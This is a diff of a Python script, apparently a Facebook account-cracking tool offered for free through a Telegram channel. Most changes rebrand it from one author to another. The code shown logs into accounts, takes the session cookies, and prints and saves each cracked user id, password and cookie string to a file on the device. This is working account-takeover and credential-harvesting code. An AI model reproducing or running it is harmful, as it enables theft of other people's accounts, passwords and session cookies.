@@ -1,4 +1,4 @@
-#========SEND======Sami KING
+#========SEND======kalyan KING
 #TG====== https://t.me/+LRlET_sIrUcxMTk1
 #=======____FREE______=======
 #========______GIVE==========
@@ -138,9 +138,9 @@ logo = f'''\r\r\x1b[0;92m
 ║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
-\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mSAMI KING]     ║ 
-\x1b[10;91m╠══[TELIGERM                  • S4MI CYBER TEAM ]   ║    
-\x1b[10;97m╠══[Github                   • Sami-King ]   ║   
+\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mKALYAN KING]     ║ 
+\x1b[10;91m╠══[TELIGERM                  • OX CYBER TEAM ]   ║    
+\x1b[10;97m╠══[Github                   • Tutul-King ]   ║   
 \x1b[10;94m╠══[Teligerm                  • https://t.me/+LRlET_sIrUcxMTk1 ]  ║ 
 \x1b[10;95m╠══[TOOLS                    • FREE ]         ║    
 \x1b[10;93m╠══[VERSION                  • 2.1 ]          ║ \x1b[10;92m
@@ -213,8 +213,8 @@ def graphrm(id,psd,tid):
                 ck.update({xk['name']: xk['value']})
             coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
             iid = re.findall('c_user=(.*);xs', coki)[0]
-            print(f'''\r\r\x1b[10;92m[Sami-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
-            os.system('espeak -a 300 "Sami,  Ok,  id"')
+            print(f'''\r\r\x1b[10;92m[Tutul-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
+            os.system('espeak -a 300 "Tutul,  Ok,  id"')
             ok.append(id)
             open('/sdcard/1T-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
             if 'y' in cokix:
